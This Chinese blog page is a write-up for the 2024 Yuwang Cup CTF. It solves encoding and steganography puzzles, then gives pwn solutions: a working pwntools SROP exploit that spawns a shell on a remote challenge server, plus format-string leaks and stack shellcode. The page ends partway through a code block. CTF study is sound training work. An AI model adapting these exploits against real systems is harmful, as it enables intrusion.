<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Miscmisc1-通知步骤 显然这里藏了东西 更改一下颜色就出来了  收获简单的文档隐写，通知做题在一起，挺好玩的 misc2-编码步骤第一段编码直接BrainFuck解码即可  第二段是JS编码，放控制台直接跑出结果   第三段也是BrainFuck解码  三段拼接即可获得完整flag 收获都是解密，考察对工具的使用和对常见编码的总结 misc3-蓝牙步骤wireshark打开流量包，搜索字符">
<meta property="og:type" content="article">
<meta property="og:title" content="2024御网杯-WP">
<meta property="og:url" content="http://example.com/2024/10/27/2024%E5%BE%A1%E7%BD%91%E6%9D%AF-WP/index.html">
<meta property="og:site_name" content="F0T1-CTF">
<meta property="og:description" content="Miscmisc1-通知步骤 显然这里藏了东西 更改一下颜色就出来了  收获简单的文档隐写，通知做题在一起，挺好玩的 misc2-编码步骤第一段编码直接BrainFuck解码即可  第二段是JS编码，放控制台直接跑出结果   第三段也是BrainFuck解码  三段拼接即可获得完整flag 收获都是解密，考察对工具的使用和对常见编码的总结 misc3-蓝牙步骤wireshark打开流量包，搜索字符">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924154916931.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924155011128.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922081754666.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922084013300.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922090913274.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926111813988.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926113248451.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924150956915.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924153733478.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924154015021.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924154200387.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926114600896.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926114837654.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926114931076.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926115301048.png">
<meta property="og:image" content="c:\Users\Administrator\OneDrive\%E4%BD%9C%E4%B8%9A\WXWork\1688856875484326\Cache\Image\2024-09\%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1727256079361.png">
<meta property="og:image" content="c:\Users\Administrator\OneDrive\%E4%BD%9C%E4%B8%9A\WXWork\1688856875484326\Cache\Image\2024-09\8f007ce9a96debf5cbf85631fb591f1.png">
<meta property="og:image" content="c:\Users\Administrator\OneDrive\%E4%BD%9C%E4%B8%9A\WXWork\1688856875484326\Cache\Image\2024-09\%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_17272630665376.png">
<meta property="og:image" content="c:\Users\Administrator\OneDrive\%E4%BD%9C%E4%B8%9A\WXWork\1688856875484326\Cache\Image\2024-09\%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_17272630822832.png">
<meta property="og:image" content="c:\Users\Administrator\OneDrive\%E4%BD%9C%E4%B8%9A\WXWork\1688856875484326\Cache\Image\2024-09\%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_17272631627837.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926114202161.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929175339437.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929175423093.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929180700711.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240928161245844.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240928161349967.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240928161450358.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240928162014451.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926195252166.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926200509596.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240928153245194.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923212821051.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923212852566.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923212955282.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923213215173.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923213248687.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924195944466.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923215555927.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922160722366.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922160746079.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922175219339.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926173521134.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926192744443.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926173842378.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922172415468.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922172133867.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922172000338.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164121037.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164135304.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164201427.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164241228.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164523660.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164539449.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922164629404.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929165304889.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929171158104.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929171138195.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929165955793.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929170347326.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929115452847.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929111513708.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929111645192.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929112419460.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929112705132.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929113113140.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929123426461.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929123310405.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929123255677.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929182107355.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929183727110.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929185020506.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929190127735.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929190624136.png">
<meta property="og:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929191119474.png">
<meta property="article:published_time" content="2024-10-27T13:52:14.000Z">
<meta property="article:modified_time" content="2024-10-28T11:59:39.040Z">
<meta property="article:author" content="CTF-DUAN">
<meta property="article:tag" content="各方向">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924154916931.png">

<link rel="canonical" href="http://example.com/2024/10/27/2024%E5%BE%A1%E7%BD%91%E6%9D%AF-WP/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>2024御网杯-WP | F0T1-CTF</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">F0T1-CTF</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">从0到1CTFer成长之路</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/27/2024%E5%BE%A1%E7%BD%91%E6%9D%AF-WP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CTF-DUAN">
      <meta itemprop="description" content="CTF学习">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="F0T1-CTF">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2024御网杯-WP
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-10-27 21:52:14" itemprop="dateCreated datePublished" datetime="2024-10-27T21:52:14+08:00">2024-10-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-10-28 19:59:39" itemprop="dateModified" datetime="2024-10-28T19:59:39+08:00">2024-10-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="misc1-通知"><a href="#misc1-通知" class="headerlink" title="misc1-通知"></a>misc1-通知</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924154916931.png" alt="image-20240924154916931"></p>
<p>显然这里藏了东西</p>
<p>更改一下颜色就出来了</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924155011128.png" alt="image-20240924155011128"></p>
<h3 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h3><p>简单的文档隐写，通知做题在一起，挺好玩的</p>
<h2 id="misc2-编码"><a href="#misc2-编码" class="headerlink" title="misc2-编码"></a>misc2-编码</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><p>第一段编码直接BrainFuck解码即可</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922081754666.png" alt="image-20240922081754666"></p>
<p>第二段是JS编码，放控制台直接跑出结果</p>
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922084013300.png" alt="image-20240922084013300" style="zoom: 67%;" />

<p>第三段也是BrainFuck解码</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922090913274.png" alt="image-20240922090913274"></p>
<p>三段拼接即可获得完整flag</p>
<h3 id="收获-1"><a href="#收获-1" class="headerlink" title="收获"></a>收获</h3><p>都是解密，考察对工具的使用和对常见编码的总结</p>
<h2 id="misc3-蓝牙"><a href="#misc3-蓝牙" class="headerlink" title="misc3-蓝牙"></a>misc3-蓝牙</h2><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h3><p>wireshark打开流量包，搜索字符串flag即可找到关键信息</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926111813988.png" alt="image-20240926111813988"></p>
<p>一个txt，一个key</p>
<p>将文件导出，进制转换后进行异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">encrypted_data = <span class="number">10004583275926070044326083910251708233320797779355779208703097816305188140191914132269450797</span></span><br><span class="line">decryption_key = <span class="number">5216294695211820293806247029887026154798297270637676463374801674229881314620340407569315152</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 encrypted_data 转换为十六进制字符串并去除开头的 &#x27;0x&#x27;</span></span><br><span class="line">encrypted_data_hex = <span class="built_in">hex</span>(encrypted_data)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 decryption_key 转换为十六进制字符串并去除开头的 &#x27;0x&#x27;</span></span><br><span class="line">decryption_key_hex = <span class="built_in">hex</span>(decryption_key)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到 encrypted_data_hex 和 decryption_key_hex 中的较长长度</span></span><br><span class="line">max_length = <span class="built_in">max</span>(<span class="built_in">len</span>(encrypted_data_hex), <span class="built_in">len</span>(decryption_key_hex))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 zfill 方法对较短的字符串进行零填充，使其长度与较长的字符串相同</span></span><br><span class="line">encrypted_data_hex = encrypted_data_hex.zfill(max_length)</span><br><span class="line">decryption_key_hex = decryption_key_hex.zfill(max_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 bytes.fromhex 方法将十六进制字符串 encrypted_data_hex 转换为字节对象</span></span><br><span class="line">encrypted_data_bytes = <span class="built_in">bytes</span>.fromhex(encrypted_data_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 bytes.fromhex 方法将十六进制字符串 decryption_key_hex 转换为字节对象</span></span><br><span class="line">decryption_key_bytes = <span class="built_in">bytes</span>.fromhex(decryption_key_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行逐字节的异或操作</span></span><br><span class="line">decrypted_data = <span class="built_in">bytes</span>([e ^ d <span class="keyword">for</span> e, d <span class="keyword">in</span> <span class="built_in">zip</span>(encrypted_data_bytes, decryption_key_bytes)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line"><span class="built_in">print</span>(decrypted_data)</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926113248451.png" alt="image-20240926113248451"></p>
<h3 id="收获-2"><a href="#收获-2" class="headerlink" title="收获"></a>收获</h3><p>流量分析加上异或加密，挺有难度，一定创新性</p>
<h2 id="misc4-base"><a href="#misc4-base" class="headerlink" title="misc4-base"></a>misc4-base</h2><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤"></a>步骤</h3><p>很明显，HTML实体编码，解码</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924150956915.png" alt="image-20240924150956915"></p>
<p>得到一段16进制的数，但是细看发现不太符合，于是将字符串逆序一下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::string s = <span class="string">&quot;936544a55314a7e4339545f47776a6e41315a7d41325743575655455b4478516a6537416&quot;</span>;</span><br><span class="line">    std::<span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">    std::cout &lt;&lt; s &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结果为 6147356a6158744b55455657534752314d7a51314e6a67774f5459334e7a41355a445639</span></span><br></pre></td></tr></table></figure>

<p>接着就可以转字符串了</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924153733478.png" alt="image-20240924153733478"></p>
<p>直接base64解密出结果</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924154015021.png" alt="image-20240924154015021"></p>
<p>看样子应该是凯撒</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924154200387.png" alt="image-20240924154200387"></p>
<p>偏移量为2时获得flag</p>
<h3 id="收获-3"><a href="#收获-3" class="headerlink" title="收获"></a>收获</h3><p>关键在于逆序，确实不好想到，不得不说让我大开眼界啊</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn1-asm"><a href="#pwn1-asm" class="headerlink" title="pwn1-asm"></a>pwn1-asm</h2><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤"></a>步骤</h3><p>拖到IDA查看</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926114600896.png" alt="image-20240926114600896"></p>
<p>可以看到sys_weite函数将msg中的文字打出来</p>
<p>接着又用sys_read读入0x190个字符，所以存在栈溢出</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926114837654.png" alt="image-20240926114837654"></p>
<p>汇编看到syscall的地址401019跟40102D</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926114931076.png" alt="image-20240926114931076"></p>
<p>字符串中找到bin sh</p>
<p>由于当前内容量较少，决定采用信号返回机制（SROP）进行进一步操作。通过控制程序的返回流，可以实现对特定寄存器的修改。将寄存器<code>rax</code>的值设定为 59，此值对应着系统调用<code>execve</code>。接着，把<code>rdi</code>设置为 “bin sh” 字符串的地址，同时将<code>rdx</code>和<code>rsi</code>的值均设为 0，以满足<code>execve(&quot;bin sh&quot;, 0, 0)</code>的参数要求。最后，将<code>rip</code>（指令指针寄存器）调整为系统调用地址<code>syscall_addr</code>，触发系统调用，从而实现预期的攻击目标。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置架构为 amd64</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接远程服务器</span></span><br><span class="line">p = remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>, <span class="number">20523</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一些地址常量</span></span><br><span class="line">ret_addr = <span class="number">0x000000000040102f</span></span><br><span class="line">mov_eax_addr = <span class="number">0x40101B</span></span><br><span class="line">syscall_addr = <span class="number">0x40102D</span></span><br><span class="line">bin_sh_addr = <span class="number">0x40200A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建信号返回帧</span></span><br><span class="line">sign_frame = SigreturnFrame()</span><br><span class="line">sign_frame.rax = <span class="number">59</span></span><br><span class="line">sign_frame.rdi = bin_sh_addr</span><br><span class="line">sign_frame.rsi = <span class="number">0</span></span><br><span class="line">sign_frame.rdx = <span class="number">0</span></span><br><span class="line">sign_frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造第一段 payload</span></span><br><span class="line">payload = p64(mov_eax_addr) + p64(ret_addr) * <span class="number">5</span> + p64(syscall_addr) + <span class="built_in">bytes</span>(sign_frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造第二段 payload</span></span><br><span class="line">payload = p64(ret_addr) + p64(ret_addr)[:<span class="number">7</span>]</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926115301048.png" alt="image-20240926115301048"></p>
<h3 id="收获-4"><a href="#收获-4" class="headerlink" title="收获"></a>收获</h3><p>这题考查SROP，难度还行</p>
<h2 id="pwn2-ret"><a href="#pwn2-ret" class="headerlink" title="pwn2-ret"></a>pwn2-ret</h2><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤"></a>步骤</h3><p>没有开保护，IDA分析</p>
<p>output中找到格式化字符串</p>
<p><img src="C:\Users\Administrator\OneDrive\作业\WXWork\1688856875484326\Cache\Image\2024-09\企业微信截图_1727256079361.png" alt="企业微信截图_1727256079361"></p>
<p>发现input函数中存在溢出，但这个溢出是基于一个rand（）函数生成的随机数来实现的</p>
<p><img src="C:\Users\Administrator\OneDrive\作业\WXWork\1688856875484326\Cache\Image\2024-09\8f007ce9a96debf5cbf85631fb591f1.png" alt="8f007ce9a96debf5cbf85631fb591f1"></p>
<p>注意到一个带有时间戳的<code>srand()</code>函数。在这种情况下，由于使用的是伪随机数生成器，我们可以通过获取相同的时间来估算种子值。依据预测出的种子值，我们能够生成随机数，并且确保满足溢出的要求</p>
<p><img src="C:\Users\Administrator\OneDrive\作业\WXWork\1688856875484326\Cache\Image\2024-09\企业微信截图_17272630665376.png" alt="企业微信截图_17272630665376"></p>
<p>通过输入 “aaaa%$8x”，可以观察到格式化字符串的偏移量为 7</p>
<p><img src="C:\Users\Administrator\OneDrive\作业\WXWork\1688856875484326\Cache\Image\2024-09\企业微信截图_17272630822832.png" alt="企业微信截图_17272630822832"></p>
<p>利用格式化字符串漏洞，我们能够获取缓冲区（buf）的位置</p>
<p><img src="C:\Users\Administrator\OneDrive\作业\WXWork\1688856875484326\Cache\Image\2024-09\企业微信截图_17272631627837.png" alt="企业微信截图_17272631627837"></p>
<p>借助<code>pwntools</code>的<code>shellcraft</code>工具，我们可以生成 shellcode，并将其写入栈中，最终实现执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 